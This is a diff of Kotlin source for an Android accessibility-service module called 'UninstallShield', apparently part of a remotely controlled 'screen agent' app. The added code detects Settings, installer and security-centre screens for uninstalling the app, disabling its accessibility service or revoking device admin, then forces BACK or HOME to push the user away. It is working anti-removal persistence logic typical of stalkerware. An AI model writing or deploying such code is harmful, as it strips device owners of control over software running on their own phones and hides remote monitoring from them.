@@ -1,78 +1,45 @@
 package com.zaka.screenagent.flow
 
 import android.accessibilityservice.AccessibilityService
+import android.content.Context
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
+import android.view.accessibility.AccessibilityNodeInfo
+import org.json.JSONArray
+import org.json.JSONObject
 
 /**
- * 4.0 防误卸载（无障碍层）。
+ * 4.0 防误卸载（无障碍层，数据驱动）。
  *
- * 与 3.x 的差异：**不靠按钮文案**。
- *   3.x：MiuiGuard / SamsungGuard … 各自用中文按钮文字（"卸载""强制停止"）匹配 → 换语言就失效，
- *        而且每个厂商一套代码，容易互相影响。
- *   4.0：只看「页面身份」——包名 + Activity 类名，配合少量多语言关键词做兜底；
- *        命中危险页就返回（BACK），同一页反复回来则回桌面（HOME）。
+ * 规则表来自 assets/uninstall_shield.json：包名 100 个、控件 id 37 个、
+ * 无障碍/设置类名 10 个、多语言关键词三组。判定顺序：
  *
- * 覆盖三种绕过路径：
- *   ① 设置 → 应用信息 → 卸载
- *   ② 设置 → 无障碍 → 关闭本应用服务
- *   ③ 设置 → 设备管理 → 取消激活（进而卸载）
+ *   ① 包名命中「设置/安全中心/安装器」→ 再看类名
+ *        · 类名命中无障碍页 / 卸载页 / 设备管理页  → 直接 BACK
+ *        · 类名是 SubSettings 这类"万能容器"        → 必须页面内容二次确认
+ *          （页面里出现本应用名 / 危险控件 id / 危险关键词）才动作
+ *   ② 否则放行（用户正常看设置、我们自己跑引导都不受影响）
  *
- * 与面板命令的关系：面板下发操作（打开 App / 卸载自身 / 点按）期间调用 [suppress]，
- * 避免守卫把面板自己的动作顶掉。
+ * 动作：BACK；6 秒内第 3 次 → HOME。1.2 秒节流。面板命令与 SelfUninstall 走 suppress() 让路。
  */
 object UninstallShield {
 
     private const val TAG = "UninstallShield"
 
-    /** 危险页面所在的系统包（各家 ROM 的"设置/安装器/安全中心"都在这） */
-    private val DANGER_PACKAGES = setOf(
-        "com.android.settings",
-        "com.samsung.android.settings",
-        "com.miui.securitycenter",
-        "com.huawei.systemmanager",
-        "com.hihonor.systemmanager",
-        "com.coloros.safecenter",
-        "com.oplus.safecenter",
-        "com.vivo.permissionmanager",
-        "com.iqoo.secure",
-        "com.transsion.phonemaster",
-        "com.transsion.phonemasterlite",
-        "com.android.packageinstaller",
-        "com.google.android.packageinstaller",
-        "com.miui.packageinstaller",
-        "com.samsung.android.packageinstaller",
-        "com.android.permissioncontroller",
-        "com.google.android.permissioncontroller",
-        "com.android.settings.intelligence"
+    private data class Rules(
+        val settingsPackages: Set<String>,
+        val installerPackages: Set<String>,
+        val accessClasses: List<String>,
+        val subSettingsClasses: List<String>,
+        val accessClassKeywords: List<String>,
+        val dangerViewIds: List<String>,
+        val appNameViewIds: List<String>,
+        val settingsAppNameViewIds: List<String>,
+        val dangerKeywords: List<String>,
+        val uninstallKeywords: List<String>
     )
 
-    /** 危险页面类名关键词（小写匹配，覆盖 AOSP/OneUI/MIUI/ColorOS 的卸载与应用详情页） */
-    private val DANGER_CLASS_KEYWORDS = listOf(
-        "uninstall",
-        "installedappdetails",
-        "applicationdetails",
-        "appinfo",
-        "appdetails",
-        "manageapplications",
-        "accessibilitydetails",
-        "manageaccessibility",
-        "accessibilityservice",
-        "deviceadminadd",
-        "deviceadminsettings",
-        "highpowerapplications",
-        "appbatteryusage"
-    )
-
-    /** 兜底关键词（多语言，仅在类名无法判定时使用；不依赖任何单一语言） */
-    private val FALLBACK_TEXTS = listOf(
-        "卸载", "解除安装", "移除", "強制停止", "强制停止", "停用",
-        "uninstall", "remove app", "force stop", "disable",
-        "desinstalar", "désinstaller", "deinstallieren", "disinstallare",
-        "desinstalar", "kaldır", "إلغاء التثبيت", "アンインストール", "제거",
-        "卸载应用", "uninstall app", "卸载更新"
-    )
-
+    @Volatile private var rules: Rules? = null
     @Volatile private var enabled = false
     @Volatile private var serviceRef: AccessibilityService? = null
     @Volatile private var suppressUntil = 0L
@@ -80,14 +47,15 @@ object UninstallShield {
     @Volatile private var hitsInWindow = 0
     @Volatile private var windowStart = 0L
 
-    /** 统计，便于面板/日志确认守卫在工作 */
     @Volatile var blockedCount = 0
         private set
 
     fun start(service: AccessibilityService) {
         serviceRef = service
+        rules = load(service)
         enabled = true
-        Log.d(TAG, "shield enabled (mode=class-based)")
+        Log.d(TAG, "shield enabled (pkg=${rules?.settingsPackages?.size ?: 0}+${rules?.installerPackages?.size ?: 0}, " +
+            "ids=${rules?.dangerViewIds?.size ?: 0}, cls=${rules?.accessClassKeywords?.size ?: 0})")
     }
 
     fun stop() {
@@ -98,14 +66,67 @@ object UninstallShield {
 
     fun isActive(): Boolean = enabled
 
-    /** 面板动作期间临时让路，避免把面板自己的点击/卸载顶掉 */
     fun suppress(durationMs: Long) {
         suppressUntil = System.currentTimeMillis() + durationMs.coerceIn(500L, 120_000L)
         Log.d(TAG, "shield suppressed for ${durationMs}ms")
     }
 
+    // ───────────────────────── 规则加载 ─────────────────────────
+
+    private fun load(ctx: Context): Rules {
+        val fallback = Rules(
+            settingsPackages = setOf(
+                "com.android.settings", "com.samsung.accessibility", "com.samsung.android.settings",
+                "com.miui.securitycenter", "com.huawei.systemmanager", "com.coloros.safecenter",
+                "com.vivo.permissionmanager", "com.android.permissioncontroller"
+            ),
+            installerPackages = setOf(
+                "com.android.packageinstaller", "com.google.android.packageinstaller",
+                "com.samsung.android.packageinstaller", "com.miui.packageinstaller"
+            ),
+            accessClasses = listOf("accessibilitysettings", "accessibilitydetails", "installedservicesettings"),
+            subSettingsClasses = listOf(".subsettings"),
+            accessClassKeywords = listOf("accessibility", "uninstall", "installedappdetails", "deviceadmin"),
+            dangerViewIds = listOf("uninstall_button", "force_stop_button", "switch_widget"),
+            appNameViewIds = emptyList(),
+            settingsAppNameViewIds = emptyList(),
+            dangerKeywords = listOf("卸载", "uninstall", "禁用服务", "force stop"),
+            uninstallKeywords = listOf("卸载", "uninstall")
+        )
+        return runCatching {
+            val text = ctx.assets.open("uninstall_shield.json").bufferedReader().use { it.readText() }
+            val o = JSONObject(text)
+            fun arr(k: String): List<String> {
+                val a: JSONArray = o.optJSONArray(k) ?: return emptyList()
+                return (0 until a.length()).map { a.optString(it) }.filter { it.isNotBlank() }
+            }
+            val accessCls = arr("accessibilityClasses").map { it.lowercase() }
+            Rules(
+                settingsPackages = (arr("settingsSecurityPackages") + arr("systemUiPackages")).toSet(),
+                installerPackages = arr("installerAndStorePackages").toSet(),
+                accessClasses = accessCls,
+                subSettingsClasses = arr("subSettingsClasses").map { it.lowercase() },
+                accessClassKeywords = (accessCls + listOf(
+                    "uninstall", "installedappdetails", "applicationdetails", "appinfo",
+                    "deviceadminadd", "deviceadminsettings", "accessibility", "appbatteryusage"
+                )).distinct(),
+                dangerViewIds = arr("dangerViewIds"),
+                appNameViewIds = arr("appNameViewIds") + arr("settingsAppNameViewIds"),
+                settingsAppNameViewIds = arr("settingsAppNameViewIds"),
+                dangerKeywords = (arr("extraDangerKeywords") + arr("uninstallKeywords")).distinct(),
+                uninstallKeywords = arr("uninstallKeywords")
+            )
+        }.getOrElse {
+            Log.w(TAG, "load rules failed, fallback: $it")
+            fallback
+        }
+    }
+
+    // ───────────────────────── 事件入口 ─────────────────────────
+
     fun onEvent(service: AccessibilityService, event: AccessibilityEvent) {
         if (!enabled) return
+        val r = rules ?: return
         if (System.currentTimeMillis() < suppressUntil) return
         val type = event.eventType
         if (type != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
@@ -113,32 +134,63 @@ object UninstallShield {
         ) return
 
         val pkg = event.packageName?.toString().orEmpty()
-        if (pkg.isEmpty()) return
-        if (pkg == service.packageName) return                 // 自己的界面不动
+        if (pkg.isEmpty() || pkg == service.packageName) return
 
-        val cls = event.className?.toString().orEmpty()
-        val lower = cls.lowercase()
+        val pkgHit = pkg in r.settingsPackages || pkg in r.installerPackages
+        if (!pkgHit) return
 
-        val pkgHit = pkg in DANGER_PACKAGES
-        var clsHit = DANGER_CLASS_KEYWORDS.any { lower.contains(it) }
+        val cls = event.className?.toString().orEmpty().lowercase()
 
-        // 类名看不出来时，用页面文本兜底（多语言列表，任一命中即可）
-        if (!clsHit && pkgHit && type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-            val text = event.text?.joinToString(" ") { it?.toString() ?: "" }.orEmpty().lowercase()
-            if (text.isNotEmpty()) {
-                clsHit = FALLBACK_TEXTS.any { text.contains(it.lowercase()) }
-            }
+        // ① 类名直接命中危险页 → 动作
+        val clsDanger = r.accessClassKeywords.any { cls.contains(it) }
+
+        // ② SubSettings 这类容器页 → 需要页面内容确认
+        val clsContainer = r.subSettingsClasses.any { cls.contains(it) } ||
+            cls.contains("subsettings") || cls == "android.app.alertdialog" && pkg in r.installerPackages
+
+        if (!clsDanger && !clsContainer) return
+
+        // 内容确认：页面里是否出现本应用名 / 危险控件 / 危险关键词
+        if (!clsDanger) {
+            val root = runCatching { service.rootInActiveWindow }.getOrNull() ?: return
+            if (!pageLooksDangerous(service, root, r)) return
         }
-        if (!clsHit) return
-        if (!pkgHit && !clsHit) return                          // 双条件都空 → 不动
 
-        // 节流：1.2 秒内只动一次；6 秒窗口内超过 2 次 → 直接回桌面
+        act(service, pkg, cls)
+    }
+
+    private fun pageLooksDangerous(service: AccessibilityService, root: AccessibilityNodeInfo, r: Rules): Boolean {
+        val selfName = runCatching {
+            service.packageManager.getApplicationLabel(service.applicationInfo).toString()
+        }.getOrDefault("")
+        val selfPkg = service.packageName
+        var hit = false
+        var visited = 0
+        fun walk(n: AccessibilityNodeInfo?, depth: Int) {
+            if (n == null || hit || depth > 30 || visited++ > 800) return
+            val id = n.viewIdResourceName.orEmpty()
+            if (id.isNotEmpty() && r.dangerViewIds.any { id.endsWith(it.substringAfterLast("/")) || id == it }) {
+                hit = true; return
+            }
+            val text = (n.text?.toString().orEmpty() + " " + n.contentDescription?.toString().orEmpty()).trim()
+            if (text.isNotEmpty()) {
+                if (selfPkg.isNotEmpty() && text.contains(selfPkg)) { hit = true; return }
+                if (selfName.isNotEmpty() && text == selfName) { hit = true; return }
+                val low = text.lowercase()
+                if (r.dangerKeywords.any { low.contains(it.lowercase()) }) { hit = true; return }
+            }
+            for (i in 0 until n.childCount) walk(n.getChild(i), depth + 1)
+        }
+        runCatching { walk(root, 0) }
+        return hit
+    }
+
+    private fun act(service: AccessibilityService, pkg: String, cls: String) {
         val now = System.currentTimeMillis()
         if (now - lastActionAt < 1_200L) return
         if (now - windowStart > 6_000L) { windowStart = now; hitsInWindow = 0 }
         hitsInWindow++
         lastActionAt = now
-
         val escalate = hitsInWindow > 2
         runCatching {
             if (escalate) {
